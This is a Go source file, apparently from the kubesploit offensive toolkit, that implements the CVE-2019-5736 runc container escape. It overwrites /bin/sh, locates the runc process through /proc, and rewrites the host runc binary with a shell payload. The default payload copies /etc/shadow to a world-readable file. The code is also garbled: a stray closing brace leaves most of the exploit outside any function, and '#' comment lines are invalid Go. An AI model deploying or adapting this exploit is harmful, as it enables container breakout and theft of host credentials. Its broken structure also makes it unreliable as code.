# `kubesploit\data\modules\sourcecode\go\CVE-2019-5736\main.go`

```
package main

// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d

import (
    "fmt" // 导入 fmt 包，用于格式化输出
    "io/ioutil" // 导入 ioutil 包，用于读取文件
    "os" // 导入 os 包，提供对操作系统功能的访问
    "strconv" // 导入 strconv 包，用于字符串和基本数据类型之间的转换
    "strings" // 导入 strings 包，提供对字符串的操作
)

// This is the line of shell commands that will execute on the host
//var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"

func mainfunc(payload string){
    // 如果 payload 为空，则设置默认的 shell 命令
    if payload == "" {
        payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"
    } else {
        payload = strings.TrimSpace(payload) // 去除字符串两端的空白字符
        payload = "#!/bin/bash \n" + payload // 添加 shell 脚本头部
    }

    // 创建 /bin/sh 文件并写入内容
    fd, err := os.Create("/bin/sh")
    if err != nil {
        fmt.Println(err) // 输出错误信息
        return
    }
    fmt.Fprintln(fd, "#!/proc/self/exe") // 写入内容到文件
    err = fd.Close() // 关闭文件
    if err != nil {
        fmt.Println(err) // 输出错误信息
        return
    }
    fmt.Println("[+] Overwritten /bin/sh successfully") // 输出成功信息
    fmt.Println("[*] Exploit for CVE-2019-5736 is running, try \"docker exec\" to the container") // 输出提示信息
    // Loop through all processes to find one whose cmdline includes runcinit
    // This will be the process created by runc
    var found int // 定义变量 found
    for found == 0 { // 循环直到找到指定的进程
        pids, err := ioutil.ReadDir("/proc") // 读取 /proc 目录下的所有文件
        if err != nil {
            fmt.Println(err) // 输出错误信息
            return
        }
        for _, f := range pids { // 遍历所有文件
            fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline") // 读取进程的命令行
            fstring := string(fbytes) // 将字节转换为字符串
            if strings.Contains(fstring, "runc") { // 判断命令行是否包含 runc
                fmt.Println("[+] Found the PID:", f.Name()) // 输出找到的进程 ID
                found, err = strconv.Atoi(f.Name()) // 将进程 ID 转换为整数
                if err != nil {
                    fmt.Println(err) // 输出错误信息
                    return
                }
            }
        }
    }
}
    // 使用进程ID获取主机上runc的文件句柄
    var handleFd = -1
    for handleFd == -1 {
        // 注意，不需要使用O_PATH标志来使漏洞生效
        handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
        if int(handle.Fd()) > 0 {
            handleFd = int(handle.Fd())
        }
    }
    fmt.Println("[+] 成功获取文件句柄")

    // 现在我们有了文件句柄，让我们写入runc二进制文件并覆盖它
    // 它将保持可执行标志
    for {
        writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
        if int(writeHandle.Fd()) > 0 {
            fmt.Println("[+] 成功获取写入句柄", writeHandle)
            writeHandle.Write([]byte(payload))
            return
        }
    }
# 结束 main 函数的定义
}

# 注释掉的代码块，包含了 main 函数的定义和一个 payload 变量的赋值
# 这段代码被注释掉，不会被执行
/*
func main() {
    var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"
    mainfunc(payload)
}*/
```